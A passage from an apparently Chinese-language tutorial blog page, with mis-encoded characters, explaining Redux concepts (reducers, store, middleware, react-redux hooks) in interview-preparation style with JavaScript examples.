id="Reducerï¼šçŠ¶æ€è½¬æ¢çš„çº¯å‡½æ•°"><a href="#Reducerï¼šçŠ¶æ€è½¬æ¢çš„çº¯å‡½æ•°" class="headerlink" title="Reducerï¼šçŠ¶æ€è½¬æ¢çš„çº¯å‡½æ•°"></a>Reducerï¼šçŠ¶æ€è½¬æ¢çš„çº¯å‡½æ•°</h3><p><strong>æ ¸å¿ƒç‰¹å¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">todosReducer</span>(<span class="hljs-params">state = [], action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>:<br>      <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šè¿”å›æ–°å¯¹è±¡</span><br>      <span class="hljs-keyword">return</span> [...state, &#123; <span class="hljs-attr">text</span>: action.<span class="hljs-property">payload</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> &#125;];<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;TOGGLE_TODO&#x27;</span>:<br>      <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨mapåˆ›å»ºæ–°æ•°ç»„</span><br>      <span class="hljs-keyword">return</span> state.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">todo, index</span>) =&gt;</span> <br>        index === action.<span class="hljs-property">index</span> <br>          ? &#123; ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> &#125;<br>          : todo<br>      );<br>      <br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// âš ï¸ å¿…é¡»ï¼šè¿”å›å½“å‰state</span><br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸å¯å˜æ›´æ–°æ¨¡å¼</strong></p><table><thead><tr><th align="left">æ“ä½œ</th><th align="left">é”™è¯¯æ–¹å¼</th><th align="left">æ­£ç¡®æ–¹å¼</th></tr></thead><tbody><tr><td align="left">æ·»åŠ é¡¹</td><td align="left">state.push(item)</td><td align="left">[â€¦state, item]</td></tr><tr><td align="left">åˆ é™¤é¡¹</td><td align="left">state.splice(index, 1)</td><td align="left">state.filter((_, i) &#x3D;&gt; i !&#x3D;&#x3D; index)</td></tr><tr><td align="left">æ›´æ–°å¯¹è±¡å±æ€§</td><td align="left">state[prop] &#x3D; value</td><td align="left">{ â€¦state, [prop]: value }</td></tr><tr><td align="left">åµŒå¥—å¯¹è±¡æ›´æ–°</td><td align="left">state.a.b &#x3D; value</td><td align="left">{ â€¦state, a: { â€¦state.a, b: value } }</td></tr></tbody></table><p><strong>Reducer æ‹†åˆ†ä¸ç»„åˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹Reducer</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">rootReducer</span>(<span class="hljs-params">state = &#123;&#125;, action</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">todos</span>: <span class="hljs-title function_">todosReducer</span>(state.<span class="hljs-property">todos</span>, action),<br>    <span class="hljs-attr">visibilityFilter</span>: <span class="hljs-title function_">filterReducer</span>(state.<span class="hljs-property">visibilityFilter</span>, action)<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ combineReducers ç®€åŒ–</span><br><span class="hljs-keyword">import</span> &#123; combineReducers &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><span class="hljs-keyword">const</span> rootReducer = <span class="hljs-title function_">combineReducers</span>(&#123;<br>  <span class="hljs-attr">todos</span>: todosReducer,<br>  <span class="hljs-attr">visibilityFilter</span>: filterReducer<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="Storeï¼šåº”ç”¨çŠ¶æ€çš„å®¹å™¨"><a href="#Storeï¼šåº”ç”¨çŠ¶æ€çš„å®¹å™¨" class="headerlink" title="Storeï¼šåº”ç”¨çŠ¶æ€çš„å®¹å™¨"></a>Storeï¼šåº”ç”¨çŠ¶æ€çš„å®¹å™¨</h3><p><strong>æ ¸å¿ƒèŒè´£</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; createStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºStore</span><br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(rootReducer, initialState);<br><br><span class="hljs-comment">// ä¸»è¦API</span><br>store.<span class="hljs-title function_">dispatch</span>(action);  <span class="hljs-comment">// è§¦å‘çŠ¶æ€æ›´æ–°</span><br>store.<span class="hljs-title function_">getState</span>();        <span class="hljs-comment">// è·å–å½“å‰çŠ¶æ€</span><br>store.<span class="hljs-title function_">subscribe</span>(listener); <span class="hljs-comment">// ç›‘å¬çŠ¶æ€å˜åŒ–</span><br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br>store.<span class="hljs-title function_">subscribe</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ–°çŠ¶æ€:&#x27;</span>, store.<span class="hljs-title function_">getState</span>());<br>&#125;);<br><br>store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(<span class="hljs-string">&#x27;Learn Redux&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>Store å·¥ä½œæµç¨‹</strong></p><pre class="mermaid">sequenceDiagram  participant View as è§†å›¾  participant Store as Store  participant Reducer as Reducer    View->>Store: dispatch(action)  Store->>Reducer: å½“å‰state + action  Reducer->>Reducer: è®¡ç®—æ–°state  Reducer->>Store: è¿”å›æ–°state  Store->>View: é€šçŸ¥è®¢é˜…è€…æ›´æ–°</pre><h3 id="Redux-ä¸‰å¤§åŸåˆ™"><a href="#Redux-ä¸‰å¤§åŸåˆ™" class="headerlink" title="Redux ä¸‰å¤§åŸåˆ™"></a>Redux ä¸‰å¤§åŸåˆ™</h3><p>(1) å•ä¸€æ•°æ®æº (Single Source of Truth)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ•´ä¸ªåº”ç”¨åªæœ‰ä¸€ä¸ªStore</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(store.<span class="hljs-title function_">getState</span>());<br><span class="hljs-comment">/* è¾“å‡ºï¼š</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  todos: [],</span><br><span class="hljs-comment">  visibilityFilter: &#x27;SHOW_ALL&#x27;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>(2) çŠ¶æ€åªè¯» (State is Read-Only)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ ç¦æ­¢ç›´æ¥ä¿®æ”¹</span><br>store.<span class="hljs-title function_">getState</span>().<span class="hljs-property">todos</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;Illegal mutation!&#x27;</span>);<br><br><span class="hljs-comment">// âœ… å”¯ä¸€ä¿®æ”¹æ–¹å¼ï¼šdispatch(action)</span><br>store.<span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;Legal update&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>(3) çº¯å‡½æ•°ä¿®æ”¹ (Changes with Pure Functions)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Reducerå¿…é¡»æ˜¯çº¯å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">impureReducer</span>(<span class="hljs-params">state = <span class="hljs-number">0</span>, action</span>) &#123;<br>  <span class="hljs-comment">// âŒ é”™è¯¯ï¼šåŒ…å«å‰¯ä½œç”¨</span><br>  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;state&#x27;</span>, state); <br>  <br>  <span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¸çº¯ï¼ˆä¾èµ–å¤–éƒ¨å˜é‡ï¼‰</span><br>  <span class="hljs-keyword">return</span> state + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>(); <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Redux-æ•°æ®æµå®Œæ•´å‘¨æœŸ"><a href="#Redux-æ•°æ®æµå®Œæ•´å‘¨æœŸ" class="headerlink" title="Redux æ•°æ®æµå®Œæ•´å‘¨æœŸ"></a>Redux æ•°æ®æµå®Œæ•´å‘¨æœŸ</h3><pre class="mermaid">sequenceDiagram  participant View as è§†å›¾  participant Action as Action  participant Middleware as ä¸­é—´ä»¶  participant Store as Store  participant Reducer as Reducer    View->>Action: ç”¨æˆ·äº¤äº’è§¦å‘  Action->>Middleware: å¤„ç†å¼‚æ­¥/å‰¯ä½œç”¨  Middleware->>Store: dispatch(action)  Store->>Reducer: (currentState, action)  Reducer->>Store: è¿”å›newState  Store->>View: é€šçŸ¥è®¢é˜…è€…  View->>View: ä½¿ç”¨æ–°çŠ¶æ€é‡æ¸²æŸ“</pre><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-12"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-12" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆReduxè¦æ±‚Reduceræ˜¯çº¯å‡½æ•°ï¼Ÿ</strong></p><ol><li>å¯é¢„æµ‹æ€§ï¼šç›¸åŒè¾“å…¥å¿…å®šå¾—åˆ°ç›¸åŒè¾“å‡º</li><li>æ—¶é—´æ—…è¡Œï¼šæ”¯æŒçŠ¶æ€å¿«ç…§å’Œå›æ»š</li><li>æ˜“äºæµ‹è¯•ï¼šæ— éœ€æ¨¡æ‹Ÿç¯å¢ƒï¼Œç›´æ¥æµ‹è¯•è¾“å…¥è¾“å‡º</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šå¯å®‰å…¨è¿›è¡Œæµ…æ¯”è¾ƒ</li></ol><p><strong>Qï¼šReduxå¦‚ä½•å®ç°æ—¶é—´æ—…è¡Œè°ƒè¯•ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¸å¿ƒåŸç†</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createStore</span>(<span class="hljs-params">reducer</span>) &#123;<br>  <span class="hljs-keyword">let</span> state = initialState;<br>  <span class="hljs-keyword">const</span> listeners = [];<br>  <span class="hljs-keyword">const</span> history = []; <span class="hljs-comment">// â­ å†å²çŠ¶æ€è®°å½•</span><br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">dispatch</span>: <span class="hljs-function">(<span class="hljs-params">action</span>) =&gt;</span> &#123;<br>      history.<span class="hljs-title function_">push</span>(state); <span class="hljs-comment">// ä¿å­˜å½“å‰çŠ¶æ€</span><br>      state = <span class="hljs-title function_">reducer</span>(state, action); <span class="hljs-comment">// è®¡ç®—æ–°çŠ¶æ€</span><br>      listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> <span class="hljs-title function_">listener</span>());<br>    &#125;,<br>    <span class="hljs-attr">getState</span>: <span class="hljs-function">() =&gt;</span> state,<br>    <span class="hljs-attr">undo</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (history.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        state = history.<span class="hljs-title function_">pop</span>(); <span class="hljs-comment">// æ¢å¤å†å²çŠ¶æ€</span><br>        listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> <span class="hljs-title function_">listener</span>());<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// å®é™…ä½¿ç”¨redux-undoåº“</span><br><span class="hljs-keyword">import</span> undoable <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux-undo&#x27;</span>;<br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(<span class="hljs-title function_">undoable</span>(rootReducer));<br></code></pre></td></tr></table></figure><p><strong>Qï¼šReduxä¸Fluxæ¶æ„æœ‰ä½•åŒºåˆ«ï¼Ÿ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Redux</th><th align="left">Flux</th></tr></thead><tbody><tr><td align="left">Storeæ•°é‡</td><td align="left">å•ä¸€Store</td><td align="left">å¤šä¸ªStore</td></tr><tr><td align="left">Dispatcher</td><td align="left">æ— ç‹¬ç«‹Dispatcher</td><td align="left">æœ‰ä¸­å¤®Dispatcher</td></tr><tr><td align="left">çŠ¶æ€æ›´æ–°</td><td align="left">çº¯å‡½æ•°Reducer</td><td align="left">Storeå†…æ–¹æ³•æ›´æ–°</td></tr><tr><td align="left">æ ·æ¿ä»£ç </td><td align="left">ç›¸å¯¹è¾ƒå°‘</td><td align="left">ç›¸å¯¹è¾ƒå¤š</td></tr><tr><td align="left">æ—¶é—´æ—…è¡Œ</td><td align="left">åŸç”Ÿæ”¯æŒ</td><td align="left">éœ€è¦é¢å¤–å®ç°</td></tr></tbody></table><h3 id="Redux-åœ¨å‡½æ•°ç»„ä»¶ä¸­çš„ä½¿ç”¨"><a href="#Redux-åœ¨å‡½æ•°ç»„ä»¶ä¸­çš„ä½¿ç”¨" class="headerlink" title="Redux åœ¨å‡½æ•°ç»„ä»¶ä¸­çš„ä½¿ç”¨"></a>Redux åœ¨å‡½æ•°ç»„ä»¶ä¸­çš„ä½¿ç”¨</h3><p><strong>åŸºç¡€è¿æ¥æ–¹å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Provider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-comment">// æ ¹ç»„ä»¶åŒ…è£¹Provider</span><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span> <span class="hljs-attr">store</span>=<span class="hljs-string">&#123;store&#125;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br><br><span class="hljs-comment">// å­ç»„ä»¶è¿æ¥</span><br><span class="hljs-keyword">import</span> &#123; connect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params">&#123; todos, dispatch &#125;</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">connect</span>(<br>  <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123; <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span> &#125;), <span class="hljs-comment">// mapStateToProps</span><br>  <span class="hljs-function"><span class="hljs-params">dispatch</span> =&gt;</span> (&#123; dispatch &#125;)         <span class="hljs-comment">// mapDispatchToProps</span><br>)(<span class="hljs-title class_">TodoList</span>);<br></code></pre></td></tr></table></figure><p><strong>Hooks APIï¼ˆæ¨èï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useSelector, useDispatch &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// è·å–çŠ¶æ€</span><br>  <span class="hljs-keyword">const</span> todos = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">todos</span>);<br>  <br>  <span class="hljs-comment">// è·å–dispatchå‡½æ•°</span><br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">addTodo</span> = text =&gt; <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, text &#125;);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">      &#123;todos.map(todo =&gt; <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span>&gt;</span>&#123;todo.text&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>)&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Redux-ä¸­é—´ä»¶æœºåˆ¶"><a href="#Redux-ä¸­é—´ä»¶æœºåˆ¶" class="headerlink" title="Redux ä¸­é—´ä»¶æœºåˆ¶"></a>Redux ä¸­é—´ä»¶æœºåˆ¶</h3><p><strong>ä¸­é—´ä»¶åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸­é—´ä»¶ç­¾å</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">middleware</span> = store =&gt; <span class="hljs-function"><span class="hljs-params">next</span> =&gt;</span> <span class="hljs-function"><span class="hljs-params">action</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// å¤„ç†å‰é€»è¾‘</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;dispatching&#x27;</span>, action);<br>  <br>  <span class="hljs-comment">// è°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">next</span>(action);<br>  <br>  <span class="hljs-comment">// å¤„ç†åé€»è¾‘</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;next state&#x27;</span>, store.<span class="hljs-title function_">getState</span>());<br>  <span class="hljs-keyword">return</span> result;<br>&#125;;<br><br><span class="hljs-comment">// åˆ›å»ºæ”¯æŒä¸­é—´ä»¶çš„store</span><br><span class="hljs-keyword">import</span> &#123; applyMiddleware, createStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span>;<br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(<br>  rootReducer,<br>  <span class="hljs-title function_">applyMiddleware</span>(middleware1, middleware2)<br>);<br></code></pre></td></tr></table></figure><p><strong>å¸¸ç”¨ä¸­é—´ä»¶</strong></p><table><thead><tr><th align="left">ä¸­é—´ä»¶</th><th align="left">è§£å†³çš„æ ¸å¿ƒé—®é¢˜</th><th align="left">å…¸å‹ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">redux-thunk</td><td align="left">å¼‚æ­¥Actionå¤„ç†</td><td align="left">ç®€å•APIè¯·æ±‚</td></tr><tr><td align="left">redux-saga</td><td align="left">å¤æ‚å¼‚æ­¥æµç¨‹ç®¡ç†</td><td align="left">å¤šæ­¥éª¤å¼‚æ­¥ã€ç«æ€å¤„ç†</td></tr><tr><td align="left">redux-observable</td><td align="left">å“åº”å¼ç¼–ç¨‹</td><td align="left">å¤æ‚äº‹ä»¶æµå¤„ç†</td></tr><tr><td align="left">redux-logger</td><td align="left">çŠ¶æ€å˜æ›´æ—¥å¿—</td><td align="left">å¼€å‘ç¯å¢ƒè°ƒè¯•</td></tr></tbody></table><h3 id="Redux-æœ€ä½³å®è·µ"><a href="#Redux-æœ€ä½³å®è·µ" class="headerlink" title="Redux æœ€ä½³å®è·µ"></a>Redux æœ€ä½³å®è·µ</h3><p><strong>é¡¹ç›®ç»“æ„ç»„ç»‡</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">src/<br>  â”œâ”€â”€ store/           <span class="hljs-comment"># Reduxç›¸å…³</span><br>  â”‚   â”œâ”€â”€ actions/     <span class="hljs-comment"># Actionåˆ›å»ºå‡½æ•°</span><br>  â”‚   â”œâ”€â”€ reducers/    <span class="hljs-comment"># Reducerå‡½æ•°</span><br>  â”‚   â”œâ”€â”€ sagas/       <span class="hljs-comment"># Sagaä¸­é—´ä»¶</span><br>  â”‚   â””â”€â”€ store.js     <span class="hljs-comment"># Storeé…ç½®</span><br>  â”‚<br>  â”œâ”€â”€ components/      <span class="hljs-comment"># å±•ç¤ºç»„ä»¶</span><br>  â””â”€â”€ containers/      <span class="hljs-comment"># å®¹å™¨ç»„ä»¶</span><br></code></pre></td></tr></table></figure><p><strong>å‘½åè§„èŒƒ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Actionç±»å‹ï¼š&lt;åè¯&gt;_&lt;åŠ¨è¯&gt;</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USER_FETCH_REQUESTED</span> = <span class="hljs-string">&#x27;USER_FETCH_REQUESTED&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TODOS_ADD</span> = <span class="hljs-string">&#x27;TODOS_ADD&#x27;</span>;<br><br><span class="hljs-comment">// Actionåˆ›å»ºå‡½æ•°ï¼šåŠ¨è¯+åè¯</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">id</span>) &#123; ... &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">addTodo</span>(<span class="hljs-params">text</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€è®¾è®¡åŸåˆ™</strong></p><ol><li>æ‰å¹³åŒ–ç»“æ„ï¼šé¿å…åµŒå¥—è¿‡æ·±</li><li>æŒ‰ä¸šåŠ¡åŸŸæ‹†åˆ†ï¼šä¸åŒåŠŸèƒ½ç‹¬ç«‹çŠ¶æ€åˆ†æ”¯</li><li>IDé©±åŠ¨ï¼šé€šè¿‡IDå…³è”æ•°æ®</li></ol><h3 id="æ€»ç»“ï¼šRedux-æ ¸å¿ƒæ¦‚å¿µå…³ç³»å›¾"><a href="#æ€»ç»“ï¼šRedux-æ ¸å¿ƒæ¦‚å¿µå…³ç³»å›¾" class="headerlink" title="æ€»ç»“ï¼šRedux æ ¸å¿ƒæ¦‚å¿µå…³ç³»å›¾"></a>æ€»ç»“ï¼šRedux æ ¸å¿ƒæ¦‚å¿µå…³ç³»å›¾</h3><pre class="mermaid">graph TD  A[Action] -->|æè¿°| B[Reducer]  B -->|ç”Ÿæˆ| C[Store]  C -->|æä¾›| D[View]  D -->|è§¦å‘| A  E[Middleware] -->|æ‹¦æˆª| A  F[Selector] -->|è·å–| C  G[React-Redux] -->|è¿æ¥| D</pre><h2 id="5-3-Redux-ä¸­é—´ä»¶ï¼ˆredux-thunkã€redux-sagaï¼‰"><a href="#5-3-Redux-ä¸­é—´ä»¶ï¼ˆredux-thunkã€redux-sagaï¼‰" class="headerlink" title="5.3 Redux ä¸­é—´ä»¶ï¼ˆredux-thunkã€redux-sagaï¼‰"></a>5.3 Redux ä¸­é—´ä»¶ï¼ˆredux-thunkã€redux-sagaï¼‰</h2><h3 id="Redux-ä¸­é—´ä»¶æ ¸å¿ƒåŸç†"><a href="#Redux-ä¸­é—´ä»¶æ ¸å¿ƒåŸç†" class="headerlink" title="Redux ä¸­é—´ä»¶æ ¸å¿ƒåŸç†"></a>Redux ä¸­é—´ä»¶æ ¸å¿ƒåŸç†</h3><p><strong>ä¸­é—´ä»¶åœ¨æ•°æ®æµä¸­çš„ä½ç½®</strong></p><pre class="mermaid">graph LR  A[View] -->|dispatch| B[Middleware]  B -->|"next(action)"| C[Reducer]  C --> D[Store]  D -->|newState| A</pre><p><strong>ä¸­é—´ä»¶ç­¾åä¸æ‰§è¡Œé“¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 